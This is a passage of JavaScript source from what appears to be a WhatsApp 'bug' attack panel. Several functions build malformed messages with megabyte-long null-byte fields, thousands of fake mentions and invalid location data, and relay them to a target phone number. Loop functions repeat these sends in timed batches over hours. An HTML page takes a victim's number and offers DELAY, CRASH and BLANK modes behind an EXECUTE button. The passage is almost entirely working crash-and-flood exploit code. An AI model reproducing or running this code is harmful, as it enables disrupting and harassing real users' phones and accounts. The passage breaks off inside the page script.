    },
  };
  
  const message3 = {
    audioMessage: {
      url: "https://mmg.whatsapp.net/v/t62.7114-24/30579250_1011830034456290_180179893932468870_n.enc?ccb=11-4&oh=01_Q5Aa1gHANB--B8ZZfjRHjSNbgvr6s4scLwYlWn0pJ7sqko94gg&oe=685888BC&_nc_sid=5e03e0&mms3=true",
      mimetype: "audio/mpeg",
      fileSha256: "pqVrI58Ub2/xft1GGVZdexY/nHxu/XpfctwHTyIHezU=",
      fileLength: "389948",
      seconds: 24,
      ptt: false,
      mediaKey: "v6lUyojrV/AQxXQ0HkIIDeM7cy5IqDEZ52MDswXBXKY=",
      fileEncSha256: "fYH+mph91c+E21mGe+iZ9/l6UnNGzlaZLnKX1dCYZS4=",
      contextInfo: {
        remoteJid: "X",
        participant: "0@s.whatsapp.net",
        stanzaId: "1234567890ABCDEF",
        mentionedJid: mentionedJidList,
      }
    }
  };
  
  const msg = generateWAMessageFromContent(target, message1, message2, message3, {});

  await sock.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: undefined,
              },
            ],
          },
        ],
      },
    ],
  });
  
  if (mention) {
    await sock.relayMessage(
      target, 
      {
        groupStatusMentionMessage: {
          message: {
            protocolMessage: {
              key: msg.key,
              type: 25
            }
          }
        }
      }, 
      {
        additionalNodes: [
          {
            tag: "meta",
            attrs: {
              is_status_mention: " null - exexute "
            },
            content: undefined
          }
        ]
      }
    );
  }
}

async function XNecroDelayBeta(target, mention) {
  const message1 = {
    viewOnceMessage: {
      message: {
        interactiveResponseMessage: {
          body: { 
            text: "🦠 ☇  𝐃𝐫𝐲𝐳𝐱 ˚𝐄𝐱𝐞𝐜𝐮𝐭𝐨𝐫 𝐊𝐢𝐥𝐥 𝐘𝐨𝐮𝐮 !!!", 
            format: "DEFAULT" 
          },
          nativeFlowResponseMessage: {
            name: "galaxy_message",
            paramsJson: "\u0000".repeat(1045000),
            version: 3
          },
          entryPointConversionSource: "{}"
        },
        contextInfo: {
          participant: target,
          mentionedJid: Array.from(
            { length: 1900 },
              () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
        ),
        quotedMessage: {
           paymentInviteMessage: {
             serviceType: 3,
             expiryTimestamp: Date.now() + 1814400000
             },
           },
         },
       },
     },
   };
   
  const message2 = {
    viewOnceMessage: {
      message: {
        stickerMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0&mms3=true",
          fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
          fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
          mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
          mimetype: "image/webp",
          directPath:
            "/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
          fileLength: { low: 1, high: 0, unsigned: true },
          mediaKeyTimestamp: {
            low: 1746112211,
            high: 0,
            unsigned: false,
          },
          firstFrameLength: 19904,
          firstFrameSidecar: "KN4kQ5pyABRAgA==",
          isAnimated: true,
          contextInfo: {
          remoteJid: "X",
          participant: "0@s.whatsapp.net",
          stanzaId: "1234567890ABCDEF",
           mentionedJid: [
             "6285215587498@s.whatsapp.net",
             ...Array.from({ length: 1900 }, () =>
                  `1${Math.floor(Math.random() * 5000000)}@s.whatsapp.net`
              ),
            ],
            groupMentions: [],
            entryPointConversionSource: "non_contact",
            entryPointConversionApp: "whatsapp",
            entryPointConversionDelaySeconds: 467593,
          },
          stickerSentTs: {
            low: -1939477883,
            high: 406,
            unsigned: false,
          },
          isAvatar: false,
          isAiSticker: false,
          isLottie: false,
        },
      },
    },
  };
  
  const msg = generateWAMessageFromContent(target, message1, message2, {});

  await sock.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: undefined,
              },
            ],
          },
        ],
      },
    ],
  });
  
  if (mention) {
    await sock.relayMessage(target, {
      groupStatusMentionMessage: {
        message: {
          protocolMessage: {
            key: msg.key,
            type: 25
          }
        }
      }
    }, {
      additionalNodes: [{
        tag: "meta",
        attrs: {
          is_status_mention: " null - exexute "
        },
        content: undefined
      }]
    });
  }
}

async function XNecroDelayX(target, mention) {
  const X = {
    musicContentMediaId: "589608164114571",
    songId: "870166291800508",
    author: "🦠 ☇  𝐃𝐫𝐲𝐳𝐱 ˚𝐄𝐱𝐞𝐜𝐮𝐭𝐨𝐫 𝐊𝐢𝐥𝐥 𝐘𝐨𝐮𝐮 !!!",
    title: "XxX",
    artworkDirectPath: "/v/t62.76458-24/11922545_2992069684280773_7385115562023490801_n.enc?ccb=11-4&oh=01_Q5AaIaShHzFrrQ6H7GzLKLFzY5Go9u85Zk0nGoqgTwkW2ozh&oe=6818647A&_nc_sid=5e03e0",
    artworkSha256: "u+1aGJf5tuFrZQlSrxES5fJTx+k0pi2dOg+UQzMUKpI=",
    artworkEncSha256: "iWv+EkeFzJ6WFbpSASSbK5MzajC+xZFDHPyPEQNHy7Q=",
    artistAttribution: "https://www.instagram.com/_u/tamainfinity_",
    countryBlocklist: true,
    isExplicit: true,
    artworkMediaKey: "S18+VRv7tkdoMMKDYSFYzcBx4NCM3wPbQh+md6sWzBU="
  };

  const message1 = {
    requestPhoneNumberMessage: {
      contextInfo: {
        businessMessageForwardInfo: {
          businessOwnerJid: "13135550002@s.whatsapp.net"
        },
        stanzaId: "XNecrosis" + "-Id" + Math.floor(Math.random() * 99999),
        forwardingScore: 100,
        isForwarded: true,
        forwardedNewsletterMessageInfo: {
          newsletterJid: "120363321780349272@newsletter",
          serverMessageId: 1,
          newsletterName: "ោ៝".repeat(10000)
        },
        mentionedJid: [
          "13135550002@s.whatsapp.net",
          ...Array.from({ length: 1900 }, () =>
            `1${Math.floor(Math.random() * 5000000)}@s.whatsapp.net`
          )
        ],
        annotations: [
          {
            embeddedContent: {
              X
            },
            embeddedAction: true
          }
        ]
      }
    }
  };
  
  const message2 = {
    viewOnceMessage: {
      message: {
        interactiveResponseMessage: {
          body: { 
            text: "🦠 ☇  𝐃𝐫𝐲𝐳𝐱 ˚𝐄𝐱𝐞𝐜𝐮𝐭𝐨𝐫 𝐊𝐢𝐥𝐥 𝐘𝐨𝐮𝐮 !!!", 
            format: "DEFAULT" 
          },
          nativeFlowResponseMessage: {
            name: "galaxy_message",
            paramsJson: "\u0000".repeat(1045000),
            version: 3
          },
          entryPointConversionSource: "{}"
        },
        contextInfo: {
          participant: target,
          mentionedJid: Array.from(
            { length: 1900 },
              () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
        ),
        quotedMessage: {
           paymentInviteMessage: {
             serviceType: 3,
             expiryTimestamp: Date.now() + 1814400000
             },
           },
         },
       },
     },
   };
   
  const message3 = {
    viewOnceMessage: {
      message: {
        stickerMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0&mms3=true",
          fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
          fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
          mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
          mimetype: "image/webp",
          directPath:
            "/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
          fileLength: { low: 1, high: 0, unsigned: true },
          mediaKeyTimestamp: {
            low: 1746112211,
            high: 0,
            unsigned: false,
          },
          firstFrameLength: 19904,
          firstFrameSidecar: "KN4kQ5pyABRAgA==",
          isAnimated: true,
          contextInfo: {
          remoteJid: "X",
          participant: "0@s.whatsapp.net",
          stanzaId: "1234567890ABCDEF",
           mentionedJid: [
             "6285215587498@s.whatsapp.net",
             ...Array.from({ length: 1900 }, () =>
                  `1${Math.floor(Math.random() * 5000000)}@s.whatsapp.net`
              ),
            ],
            groupMentions: [],
            entryPointConversionSource: "non_contact",
            entryPointConversionApp: "whatsapp",
            entryPointConversionDelaySeconds: 467593,
          },
          stickerSentTs: {
            low: -1939477883,
            high: 406,
            unsigned: false,
          },
          isAvatar: false,
          isAiSticker: false,
          isLottie: false,
        },
      },
    },
  };
  
  const msg = generateWAMessageFromContent(target, message1, message2, message3, {});

  await sock.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: undefined,
              },
            ],
          },
        ],
      },
    ],
  });
  
  if (mention) {
    await sock.relayMessage(target, {
      groupStatusMentionMessage: {
        message: {
          protocolMessage: {
            key: msg.key,
            type: 25
          }
        }
      }
    }, {
      additionalNodes: [{
        tag: "meta",
        attrs: {
          is_status_mention: " null - exexute "
        },
        content: undefined
      }]
    });
  }
}

async function XNecroDozerX(target, mention) {
  let etc1 = generateWAMessageFromContent(target, proto.Message.fromObject({
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          header: {
            title: "",
            locationMessage: {
              degreesLatitude: -999.03499999999999,
              degreesLongitude: 922.999999999999,
              name: "\u900A",
              address: "\u0007".repeat(20000),
              jpegThumbnail: null,
            },
            hasMediaAttachment: true,
          },
          body: { 
            text: "🦠 ☇  𝐃𝐫𝐲𝐳𝐱 ˚𝐄𝐱𝐞𝐜𝐮𝐭𝐨𝐫 𝐊𝐢𝐥𝐥 𝐘𝐨𝐮𝐮 !!!" 
          },
          nativeFlowMessage: {
            messageParamsJson: "[]".repeat(4000),
            buttons: [
              {
                name: "single_select",
                buttonParamsJson: JSON.stringify({
                  title: "\u0003".repeat(1500),
                  sections: [
                    {
                      title: "",
                      rows: [],
                    },
                  ],
                }),
              },
              {
                name: "call_permission_request",
                buttonParamsJson: JSON.stringify({
                name: "\u0003".repeat(200),
                }),
              },
            ],
          },
        },
      },
    },
  }), {});
  
  let etc2 = generateWAMessageFromContent(target, proto.Message.fromObject({
    viewOnceMessage: {
      message: {
        interactiveResponseMessage: {
          body: { 
            text: "🦠 ☇  𝐃𝐫𝐲𝐳𝐱 ˚𝐄𝐱𝐞𝐜𝐮𝐭𝐨𝐫 𝐊𝐢𝐥𝐥 𝐘𝐨𝐮𝐮 !!!", 
            format: "DEFAULT" 
          },
          nativeFlowResponseMessage: {
            name: "galaxy_message",
            paramsJson: "\u0000".repeat(1045000),
            version: 3
          },
          entryPointConversionSource: "{}"
        },
        contextInfo: {
          stanzaId: target,
          participant: target,
          mentionedJid: Array.from(
            { length: 1900 },
              () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
        ),
        quotedMessage: {
           paymentInviteMessage: {
             serviceType: 3,
             expiryTimestamp: Date.now() + 1814400000
             },
           },
         },
       },
     },
   }),
   { 
     ephemeralExpiration: 0,
     forwardingScore: 9741,
     isForwarded: true,
     font: Math.floor(Math.random() * 99999999),
     background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "99999999"), 
   }
  );
   
  let etc3 = generateWAMessageFromContent(target, proto.Message.fromObject({
    viewOnceMessage: {
      message: {
        stickerMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0&mms3=true",
          fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
          fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
          mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
          mimetype: "image/webp",
          directPath:
            "/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
          fileLength: { low: 1, high: 0, unsigned: true },
          mediaKeyTimestamp: {
            low: 1746112211,
            high: 0,
            unsigned: false,
          },
          firstFrameLength: 19904,
          firstFrameSidecar: "KN4kQ5pyABRAgA==",
          isAnimated: true,
          contextInfo: {
          remoteJid: "X",
          participant: "0@s.whatsapp.net",
          stanzaId: "1234567890ABCDEF",
           mentionedJid: [
             "6285215587498@s.whatsapp.net",
             ...Array.from({ length: 1900 }, () =>
                  `1${Math.floor(Math.random() * 5000000)}@s.whatsapp.net`
              ),
            ],
            groupMentions: [],
            entryPointConversionSource: "non_contact",
            entryPointConversionApp: "whatsapp",
            entryPointConversionDelaySeconds: 467593,
          },
          stickerSentTs: {
            low: -1939477883,
            high: 406,
            unsigned: false,
          },
          isAvatar: false,
          isAiSticker: false,
          isLottie: false,
        },
      },
    },
  }), {});
  
  await sock.relayMessage("status@broadcast", etc1.message, {
    messageId: etc1.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: undefined,
              },
            ],
          },
        ],
      },
    ],
  });
  
  await sock.relayMessage("status@broadcast", etc2.message, {
    messageId: etc2.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: undefined,
              },
            ],
          },
        ],
      },
    ],
  });
  
  await sock.relayMessage("status@broadcast", etc3.message, {
    messageId: etc3.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: undefined,
              },
            ],
          },
        ],
      },
    ],
  });
  
  if (mention) {
    await sock.relayMessage(target, {
      groupStatusMentionMessage: {
        message: {
          protocolMessage: {
            key: etc1.key,
            type: 25
          }
        }
      }
    }, {
      additionalNodes: [{
        tag: "meta",
        attrs: {
          is_status_mention: " null - exexute "
        },
        content: undefined
      }]
    });
  }
  
  if (mention) {
    await sock.relayMessage(target, {
      groupStatusMentionMessage: {
        message: {
          protocolMessage: {
            key: etc2.key,
            type: 25
          }
        }
      }
    }, {
      additionalNodes: [{
        tag: "meta",
        attrs: {
          is_status_mention: " null - exexute "
        },
        content: undefined
      }]
    });
  }
  
  if (mention) {
    await sock.relayMessage(target, {
      groupStatusMentionMessage: {
        message: {
          protocolMessage: {
            key: etc3.key,
            type: 25
          }
        }
      }
    }, {
      additionalNodes: [{
        tag: "meta",
        attrs: {
          is_status_mention: " null - exexute "
        },
        content: undefined
      }]
    });
  }
}

async function XtravsBetaXxV2(target, mention) {
  const BetaXxV1 = {
    audioMessage: {
      url: "https://mmg.whatsapp.net/v/t62.7114-24/30579250_1011830034456290_180179893932468870_n.enc?ccb=11-4&oh=01_Q5Aa1gHANB--B8ZZfjRHjSNbgvr6s4scLwYlWn0pJ7sqko94gg&oe=685888BC&_nc_sid=5e03e0&mms3=true",
      mimetype: "audio/mpeg",
      fileSha256: "pqVrI58Ub2/xft1GGVZdexY/nHxu/XpfctwHTyIHezU=",
      fileLength: "389948",
      seconds: 24,
      ptt: false,
      mediaKey: "v6lUyojrV/AQxXQ0HkIIDeM7cy5IqDEZ52MDswXBXKY=",
      fileEncSha256: "fYH+mph91c+E21mGe+iZ9/l6UnNGzlaZLnKX1dCYZS4=",
      contextInfo: {
        remoteJid: "status@broadcast",
        participant: "0@s.whatsapp.net",
        stanzaId: "1234567890ABCDEF",
        mentionedJid: [
          "6285215587498@s.whatsapp.net",  ...Array.from({ length: 1990 }, () => `${Math.floor(100000000000 + Math.random() * 899999999999)}@s.whatsapp.net`
          ),
        ],
      },
    },
  };
  
  const BetaXxV2 = {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          header: {
            title: "",
            locationMessage: {
              degreesLatitude: -999.03499999999999,
              degreesLongitude: 922.999999999999,
              name: "\u900A",
              address: "\u0007".repeat(20000),
              jpegThumbnail: null,
            },
            hasMediaAttachment: true,
          },
          body: { 
            text: "🦠 ☇  𝐃𝐫𝐲𝐳𝐱 ˚𝐄𝐱𝐞𝐜𝐮𝐭𝐨𝐫 𝐊𝐢𝐥𝐥 𝐘𝐨𝐮𝐮 !!!" 
          },
          nativeFlowMessage: {
            messageParamsJson: "[]".repeat(4000),
            buttons: [
              {
                name: "single_select",
                buttonParamsJson: JSON.stringify({
                  title: "\u0003",
                  sections: [
                    {
                      title: "\u0000",
                      rows: [],
                    },
                  ],
                }),
              },
              {
                name: "call_permission_request",
                buttonParamsJson: JSON.stringify({
                name: "\u0003",
                }),
              },
            ],
          },
          contextInfo: {
            remoteJid: "status@broadcast",
            participant: "0@s.whatsapp.net",
            stanzaId: "1234567890ABCDEF",
            mentionedJid: [
              "6285215587498@s.whatsapp.net",  ...Array.from({ length: 1990 }, () => `${Math.floor(100000000000 + Math.random() * 899999999999)}@s.whatsapp.net`
              ),
            ],
          },
        },
      },
    },
  };
  
  const msg = generateWAMessageFromContent(target, BetaXxV1, BetaXxV2, {});

  await sock.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: undefined,
              },
            ],
          },
        ],
      },
    ],
  });
  
  if (mention) {
    await sock.relayMessage(
      target, 
      {
        groupStatusMentionMessage: {
          message: {
            protocolMessage: {
              key: msg.key,
              type: 25
            }
          }
        }
      }, 
      {
        additionalNodes: [
          {
            tag: "meta",
            attrs: {
              is_status_mention: " null - exexute "
            },
            content: undefined
          }
        ]
      }
    );
  }
}

async function BetaDelay(sock, target) {
    let biji = await generateWAMessageFromContent(
        target,
        {
            viewOnceMessage: {
                message: {
                    interactiveResponseMessage: {
                        body: {
                            text: " - mexx aree youu okkyy?",
                            format: "DEFAULT",
                        },
                        nativeFlowResponseMessage: {
                            name: "call_permission_request",
                            paramsJson: "\x10".repeat(1045000),
                            version: 3,
                        },
                        entryPointConversionSource: "call_permission_message",
                    },
                },
            },
        },
        {
            ephemeralExpiration: 0,
            forwardingScore: 9741,
            isForwarded: true,
            font: Math.floor(Math.random() * 99999999),
            background:
                "#" +
                Math.floor(Math.random() * 16777215)
                    .toString(16)
                    .padStart(6, "99999999"),
        }
    );
    
    let biji2 = await generateWAMessageFromContent(
        target,
        {
            viewOnceMessage: {
                message: {
                    interactiveResponseMessage: {
                        body: {
                            text: " - mexx whyyy??!",
                            format: "DEFAULT",
                        },
                        nativeFlowResponseMessage: {
                            name: "galaxy_message",
                            paramsJson: "\x10".repeat(1045000),
                            version: 3,
                        },
                        entryPointConversionSource: "call_permission_request",
                    },
                },
            },
        },
        {
            ephemeralExpiration: 0,
            forwardingScore: 9741,
            isForwarded: true,
            font: Math.floor(Math.random() * 99999999),
            background:
                "#" +
                Math.floor(Math.random() * 16777215)
                    .toString(16)
                    .padStart(6, "99999999"),
        }
    );    

    await sock.relayMessage(
        "status@broadcast",
        biji.message,
        {
            messageId: biji.key.id,
            statusJidList: [target],
            additionalNodes: [
                {
                    tag: "meta",
                    attrs: {},
                    content: [
                        {
                            tag: "mentioned_users",
                            attrs: {},
                            content: [
                                {
                                    tag: "to",
                                    attrs: { jid: target },
                                },
                            ],
                        },
                    ],
                },
            ],
        }
    );
    
    await sock.relayMessage(
        "status@broadcast",
        biji2.message,
        {
            messageId: biji2.key.id,
            statusJidList: [target],
            additionalNodes: [
                {
                    tag: "meta",
                    attrs: {},
                    content: [
                        {
                            tag: "mentioned_users",
                            attrs: {},
                            content: [
                                {
                                    tag: "to",
                                    attrs: { jid: target },
                                },
                            ],
                        },
                    ],
                },
            ],
        }
    );    
}
//═══════════//═════════⧼⧼FUNGSI DELAY⧽⧽═════════//═══════════//
function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}


//═══════════//═════════⧼⧼FUNGSI REPEAT⧽⧽═════════//═══════════//
async function Delayinvisdrayy(target) {
for (let i = 0; i < 10; i++) {
await XtravsDelayImage(target, false)
await XtravsExeDelay(target, false)
await BulldoHard(sock, target)
await XangelDelay3(target, false)
await XangelDelay3(target, false)
await XStromDelayNative(target, false)
await FolwareDelay(target, false)
await BetaDelay(sock, target);
await XtravsBetaXx(target, false)
await XtravsBetaXxV2(target, false)
await VerloadSuperXx(target, false)
await XtravsDrainHard(target, false)
await XtravsDelayAudio(target, false)
await XtravsBulldozerX(target, false)
await XNecroDelayBeta(target, false)
await XNecroDelayX(target, false)
await XNecroDozerX(target, false)
await sleep(10000);
console.log(chalk.green(`[  ☇ 𝐃𝐫𝐲𝐳𝐱 ˚𝐄𝐱𝐞𝐜𝐮𝐭𝐨𝐫 𝐒𝐞𝐧𝐝 𝟐𝟎 𝐁𝐮𝐠  ]`));
    }
}

async function Hadowhdelay(durationHours, X) {
  const totalDurationMs = durationHours * 3600000;
  const startTime = Date.now();
  let count = 0;
  let batch = 1;
  const maxBatches = 5;

  const sendNext = async () => {
    if (Date.now() - startTime >= totalDurationMs || batch > maxBatches) {
      console.log(`✓ Selesai! Total batch terkirim: ${batch - 1}`);
      return;
    }

    try {
      if (count < 100) {
        await Promise.all([
          XtravsBetaXx(X, false),
          XtravsBetaXxV2(X, false)
        ]);
        console.log(chalk.yellow(`
┌────────────────────────┐
│ ${count + 1}/100 Delay Invis
└────────────────────────┘
  `));
        count++;
        setTimeout(sendNext, 700);
      } else {
        console.log(chalk.green(`Succes Send Bugs to ${X} (Batch ${batch})`));
        if (batch < maxBatches) {
          count = 0;
          batch++;
          setTimeout(sendNext, 300000);
        } else {
          console.log(chalk.blue(`( Done ) ${maxBatches} batch.`));
        }
      }
    } catch (error) {
      console.error(`✗ Error saat mengirim: ${error.message}`);
      setTimeout(sendNext, 700);
    }
  };
  sendNext();
}

async function iosflood(durationHours, X) {
  const totalDurationMs = durationHours * 3600000;
  const startTime = Date.now();
  let count = 0;
  let batch = 1;
  const maxBatches = 5;

  const sendNext = async () => {
    if (Date.now() - startTime >= totalDurationMs || batch > maxBatches) {
      console.log(`✓ Selesai! Total batch terkirim: ${batch - 1}`);
      return;
    }

    try {
      if (count < 400) {
        await Promise.all([
          iosinVisFC(X),
          NewProtocolbug6(X),
          VtxForceDelMsg2(X)
        ]);
        console.log(chalk.yellow(`
┌────────────────────────┐
│ ${count + 1}/400 IOS🕊️
└────────────────────────┘
  `));
        count++;
        setTimeout(sendNext, 700);
      } else {
        console.log(chalk.green(`👀 Succes Send Bugs to ${X} (Batch ${batch})`));
        if (batch < maxBatches) {
          console.log(chalk.yellow(`( Grade X-ATHENA 🍂 777 ).`));
          count = 0;
          batch++;
          setTimeout(sendNext, 300000);
        } else {
          console.log(chalk.blue(`( Done ) ${maxBatches} batch.`));
        }
      }
    } catch (error) {
      console.error(`✗ Error saat mengirim: ${error.message}`);
      setTimeout(sendNext, 700);
    }
  };
  sendNext();
}

// ==================== HTML EXECUTION ==================== //
const executionPage = (
  status = "🟥 Ready",
  detail = {},
  isForm = true,
  userInfo = {},
  message = "",
  mode = ""
) => {
  const { username, expired } = userInfo;
  const formattedTime = expired
    ? new Date(expired).toLocaleString("id-ID", {
        timeZone: "Asia/Jakarta",
        year: "2-digit",
        month: "2-digit",
        day: "2-digit",
        hour: "2-digit",
        minute: "2-digit",
      })
    : "-";

  return `<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>SHADOW PHOENIX VVIP</title>
  <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@500;700&display=swap" rel="stylesheet">
  <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" rel="stylesheet">
  <style>
    * { box-sizing: border-box; margin: 0; padding: 0; }
    body {
      font-family: 'Orbitron', sans-serif;
      background: #000;
      color: #fff;
      min-height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      padding: 20px;
    }
    .container {
      background: rgba(0, 0, 0, 0.85);
      border: 1px solid #8A0303;
      padding: 24px;
      border-radius: 20px;
      max-width: 420px;
      width: 100%;
      box-shadow: 0 0 20px rgba(138, 3, 3, 0.7);
      backdrop-filter: blur(10px);
    }
    .logo {
      width: 80px;
      height: 80px;
      margin: 0 auto 12px;
      display: block;
      border-radius: 50%;
      box-shadow: 0 0 20px rgba(138, 3, 3, 0.9);
      object-fit: cover;
    }
    .username {
      font-size: 22px;
      font-weight: bold;
      text-align: center;
      margin-bottom: 6px;
      color: #fff;
    }
    .connected {
      font-size: 14px;
      color: #B22222;
      margin-bottom: 16px;
      display: flex;
      justify-content: center;
      align-items: center;
    }
    .connected::before {
      content: '';
      width: 10px;
      height: 10px;
      background: #00ff5e;
      border-radius: 50%;
      display: inline-block;
      margin-right: 8px;
    }
    input[type="text"] {
      width: 100%;
      padding: 14px;
      border-radius: 10px;
      background: #111;
      border: 1px solid #8A0303;
      color: #fff;
      margin-bottom: 16px;
      box-shadow: inset 0 0 8px rgba(138, 3, 3, 0.5);
    }
    /* Dropdown */
    .select-wrapper {
      margin-bottom: 16px;
    }
    select {
      width: 100%;
      padding: 14px;
      border-radius: 10px;
      background: #111;
      border: 1px solid #8A0303;
      color: #ff4444;
      font-weight: bold;
      text-shadow: 0 0 6px #8A0303;
      cursor: pointer;
      appearance: none;
      box-shadow: inset 0 0 8px rgba(138, 3, 3, 0.5);
    }
    select:focus {
      outline: none;
      border-color: #ff0000;
      box-shadow: 0 0 12px rgba(255, 0, 0, 0.8);
    }
    .execute-button {
      background: linear-gradient(135deg, #8A0303, #5c0000);
      color: #fff;
      padding: 14px;
      width: 100%;
      border-radius: 10px;
      font-weight: bold;
      border: none;
      margin-bottom: 12px;
      cursor: pointer;
      transition: 0.3s;
      text-shadow: 0 0 6px #8A0303;
    }
    .execute-button:disabled {
      background: #330000;
      cursor: not-allowed;
      opacity: 0.5;
    }
    .execute-button:hover:not(:disabled) {
      background: #B22222;
      box-shadow: 0 0 12px rgba(178, 34, 34, 0.9);
    }
    .footer-action-container {
      display: flex;
      flex-wrap: wrap;
      justify-content: center;
      align-items: center;
      gap: 8px;
      margin-top: 20px;
    }
    .footer-button {
      background: rgba(138, 3, 3, 0.15);
      border: 1px solid #8A0303;
      border-radius: 8px;
      padding: 8px 12px;
      font-size: 14px;
      color: #fff;
      display: flex;
      align-items: center;
      gap: 6px;
      transition: background 0.3s ease, box-shadow 0.3s ease;
    }
    .footer-button:hover {
      background: rgba(138, 3, 3, 0.3);
      box-shadow: 0 0 8px rgba(138, 3, 3, 0.7);
    }
    .footer-button a {
      text-decoration: none;
      color: #ff4444;
      display: flex;
      align-items: center;
      gap: 6px;
    }
  </style>
</head>
<body>
  <div class="container">
    <img src="https://files.catbox.moe/z7xdq5.png" alt="Logo" class="logo" />
    <div class="username">Olá, ${username || 'Anônimo'}</div>
    <div class="connected">CONNECTED</div>

    <input type="text" id="numberInput" placeholder="Please input target number. example : +628xxxxxxx or 628xxxxxxx or +1202xxxxxxx" />

    <div class="select-wrapper">
      <select id="modeSelect">
        <option value="" disabled selected>---Select Bugs---</option>
        <option value="AndrosDelay">S-P DELAY</option>
        <option value="AndrosDelay">S-P DELAY HARD</option>
        <option value="AndrosDelay">S-P BULDOZER</option>
        <option value="AndrosDelay">S-P BULDOZER HARD</option>
        <option value="AndrosDelay">S-P CRASH</option>
        <option value="AndrosDelay">S-P BLANK</option>
        <option value="AndrosDelay">S-P COMBO DELAY</option>
      </select>
    </div>

    <button class="execute-button" id="executeBtn" disabled>
      <i class="fas fa-moon"></i> EXECUTE
    </button>

    <div class="footer-action-container">
      <div class="footer-button developer">
        <a href="https://t.me/DryzxModders" target="_blank">
          <i class="fab fa-telegram"></i> Developer
        </a>
      </div>
      <div class="footer-button logout">
        <a href="/logout">
          <i class="fas fa-sign-out-alt"></i> Logout
        </a>
      </div>
      <div class="footer-button user-info">
        <i class="fas fa-user"></i> ${username || 'Desconhecido'}
        <span style="color:#ff4444; font-weight:bold;">&nbsp;•&nbsp;</span>
        <i class="fas fa-hourglass-half"></i> ${formattedTime}
      </div>
    </div>
  </div>

  <script>
  const inputField = document.getElementById('numberInput');
  const modeSelect = document.getElementById('modeSelect');
  const executeBtn = document.getElementById('executeBtn');

  function isValidNumber(number) {
    const pattern = /^\\+?\\d{7,20}$/;
    return pattern.test(number);
  }

  function toggleButton() {
